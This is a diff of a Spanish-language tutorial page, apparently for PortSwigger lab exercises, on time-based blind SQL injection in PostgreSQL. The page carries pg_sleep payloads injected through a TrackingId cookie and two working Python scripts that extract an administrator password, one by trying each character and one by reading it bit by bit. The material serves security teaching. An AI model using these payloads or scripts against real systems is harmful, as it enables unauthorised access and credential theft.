@@ -50,47 +50,100 @@ TrackingId=ggg'||(SELECT CASE WHEN (LENGTH(password)=1) THEN pg_sleep(5) ELSE pg
 
 De esta manera solo se debe ir variando el número de largo comparado del número, manualmente o automatizado como se explica en los ejercicios anteriores (con *Fuzzer* de OWASP ZAP o *Intruder*/*Turbo Intruder* de Burp Suite). Como en los otros ejercicios, la longitud es 20.
 
-Ahora debemos extraer la contraseña, teniendo en cuenta que conocemos la tabla, las columnas y hasta el nombre del usuario (administrador), una forma simple y eficaz sería la siguiente:
-`TrackingId=ggg'||(SELECT case when substring(password,%d,1)='%s' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')--+-;`
+Para extraer la contraseña, teniendo en cuenta que se conoce la tabla, las columnas y hasta el nombre del usuario, una forma simple y eficaz sería con el siguiente fragmento de SQL:
 
-De esta manera podemos ir probando entre las diferentes combinaciones donde esta %d (para ir iterando entre cada posición de la contraseña del 1 al 20) y %s (para iterar sobre todas posibles opciones las cuales incluyen los caracteres alfanuméricos).
+```sql
+SELECT CASE WHEN SUBSTRING(password,%d,1)='%s' 
+    THEN pg_sleep(5) ELSE pg_sleep(0) END 
+    FROM users WHERE username='administrator')
+```
 
-Para automatizar las consultas podemos apoyarnos en un script en Python3:
+Dado que el enfoque para automatizar la solución es con Python, en lugar de un número para posición del *substring* o un caracter a comparar con el *substring*, se utilizan los marcadores de posición `%d` y `%s` respectivamente. Esto permite sustituir con reemplazos de Python tales posiciones con valores reales de esos tipos de datos (`int` y `string`). De esta manera se puede ir probando entre las diferentes combinaciones en `%d` (para iterar entre cada posición de la contraseña del 1 al 20) y `%s` (para iterar sobre todas posibles opciones de caracteres alfanuméricos).
+
+Para automatizar las consultas, el siguiente es un ejemplo de *script* básico en Python 3 en el que apoyarse:
 
 ```python
 #!/usr/bin/python3
 import requests,time,sys,string
 
-main_url = 'https://BURPSUITE-LAB/filter?category=Pets' #URL Del laboratorio
+# URL del laboratorio
+url = 'https://LAB-ID.web-security-academy.net'
+# Caracteres alfanuméricos (sin mayúsculas)
+characters = string.ascii_lowercase + string.digits 
+password = ""
+cookie = ("XYZ'||(SELECT CASE WHEN SUBSTRING(password,%d,1)='%s' " 
+    "THEN pg_sleep(2) ELSE pg_sleep(0) END " 
+    "FROM users WHERE username='administrator')--")
 
-characters = string.ascii_lowercase + string.digits #Caracteres alfanuméricos
+print("[*] Iniciando SQLi")
+# Posiciones de la contraseña del 1 al 20
+for position in range(1,21): 
+    for character in characters:
+        cookies = { "TrackingId": cookie % (position, character) }
+        time_start=time.time()
+        requests.get(url, cookies=cookies)
+        time_end = time.time()
 
-def makeRequest():
-    print("Iniciando SQLi")
-    password = ""
+        # Tiempo de respuesta mayor a 2 segundos (inyección exitosa)
+        if time_end - time_start > 2:
+            password += character
+            sys.stdout.write(character)
+            sys.stdout.flush()
+            break
 
-    for position in range(1,21): #Posiciones de la contraseña del 0 al 20
-        for character in characters:
-
-            cookies = {
-                    'TrackingId':"XYZ'||(select case when substring(password,%d,1)='%s' then pg_sleep(2) else pg_sleep(0) end from users where username='administrator')-- -" %(position,character),
-                    'session':'session Cookie'}
-            time_start=time.time()
-            r = requests.get(main_url, cookies=cookies)
-            time_end = time.time()
-
-            if time_end - time_start > 2: #Tiempo de respuesta mayor a 2 segundos (inyeccion exitosa)
-                password += character
-                print("Password: %s (%s)"%(password,position))
-                break
-
-if __name__ == '__main__':
-    makeRequest()
+print("\n[+] Password: %s" % (password))
 ```
-Para este ejemplo se tuvo en cuenta que la contraseña del administrador solo posee letras minúsculas y números. En un caso diferente, tendríamos que incluir dentro del arreglo de "characters" todos los caracteres posibles para la contraseña (Letras mayúsculas, caracteres especiales etc).
+
+Para este ejemplo se tuvo en cuenta que la contraseña del administrador solo posee letras minúsculas y números. En un caso diferente, habría que incluir dentro de la lista `characters` todos los caracteres posibles para la contraseña (letras mayúsculas y caracteres especiales).
 
 
-La desventaja de esta tecnica es que requiere una alta cantidad de consultas para probar todas las  posibles combinaciones, si bien se realizara mediante un script para automatizarlo, si lo que queremos es optimizar la cantidad de consultas, podemos apoyarnos en los consejos de optimización nombrados en la sección [4.1 Inyeccion SQL ciega con respuestas condicionales](https://spassarop.github.io/test-page/injection_types/blind/conditional_type#optimizaciones)
+## Optimización con conversión binaria
 
+La desventaja de iterar por lista de caracteres es que requiere una alta cantidad de consultas para probar todas las  posibles combinaciones, si bien se realiza mediante un *script* para automatizarlo, para optimizar la cantidad de consultas, es conveniente apoyarse en los consejos de optimización descritos en la sección [4.1 Inyeccion SQL ciega con respuestas condicionales](/test-page/injection_types/blind/conditional_type#optimizaciones).
 
+La optimización de utilizar una conversión a binario del caracter a adivinar implica convertirlo primero a su representación numérica (con `ASCII()`), luego a *byte* con un *cast* (`::bit(8)`) y finalmente tomar bit por bit de ese byte resultante. Cada bit se compara con `0` o `1` y el resultado se acumula hasta completar 8 pedidos. Completado este proceso, se obtiene un byte que es directamente convertible a caracter.
 
+La consulta condicional SQL pasa a ser:
+
+```sql
+SELECT CASE WHEN 
+    SUBSTRING(ASCII(SUBSTRING(password,%d,1))::bit(8),%d,1)=0::bit(1)
+```
+
+El primer `%d` corresponde a la posición de caracter de contraseña (1 a 20) y el segundo a la posición de bit (1 a 8). El *script* modificado para reconstruir cada byte es el siguiente:
+
+```python
+#!/usr/bin/python3
+import requests,time,sys
+
+# URL del laboratorio
+url = 'https://LAB-ID.web-security-academy.net'
+password = ""
+cookie = ("XYZ'||(SELECT CASE WHEN SUBSTRING(ASCII(SUBSTRING(password,%d,1))::bit(8),%d,1)=0::bit(1) "
+    "THEN pg_sleep(2) ELSE pg_sleep(0) END "
+    "FROM users WHERE username='administrator')--")
+
+print("[*] Iniciando SQLi")
+# Posiciones de la contraseña del 1 al 20
+for position in range(1,21):
+    byte = ""
+    # Posiciones de bit del 1 al 8
+    for bit_position in range(1,9):
+        cookies = { "TrackingId": cookie % (position, bit_position) }
+        time_start=time.time()
+        requests.get(url, cookies=cookies)
+        time_end = time.time()
+
+        # Tiempo de respuesta mayor a 2 segundos (inyección exitosa)
+        if time_end - time_start > 2:
+            byte += "0"
+        else:
+            byte += "1"
+
+    extracted_chr = chr(int(byte,2))
+    password += extracted_chr
+    sys.stdout.write(extracted_chr)
+    sys.stdout.flush()
+
+print("\n[+] Password: %s" % (password))
+```
